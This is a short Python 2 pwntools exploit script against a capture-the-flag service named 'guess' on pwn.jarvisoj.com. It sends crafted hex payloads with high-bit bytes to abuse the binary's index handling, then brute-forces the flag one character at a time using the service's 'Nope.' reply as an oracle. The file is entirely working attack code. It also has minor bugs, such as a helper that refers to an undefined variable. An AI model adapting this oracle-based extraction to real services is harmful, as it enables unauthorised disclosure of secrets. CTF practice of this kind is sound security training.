from pwn import *
#context.log_level = 'debug'
context.terminal = ['terminator','-x','bash','-c']

def e(n):
	return b.encode('hex')

rr=1

if rr:
	cn = remote('pwn.jarvisoj.com', 9878)
else:
	cn = remote('127.0.0.1',9999)

bin = ELF('./guess')

cn.recv()

raw_pay=''
for i in range(50):
	raw_pay += '0'
	raw_pay += chr(0x40+128+i)

out=''
raw_pay = out + raw_pay[len(out):]
for i in range(len(out)/2,50): 
	for ch in range(128):
		if chr(ch).isalnum() or chr(ch) == '{' or chr(ch) == '}':
			pay = list(raw_pay)
			pay[2*i] = chr(ch).encode('hex')[0]
			pay[2*i+1] = chr(ch).encode('hex')[1]
			pay = ''.join(pay)
			cn.sendline(pay)
			ret = cn.recvline()
			cn.recv()
			if ret != 'Nope.\n':
				raw_pay = pay
				print pay
				break

print "\n\nfind flag: " + pay.decode('hex')


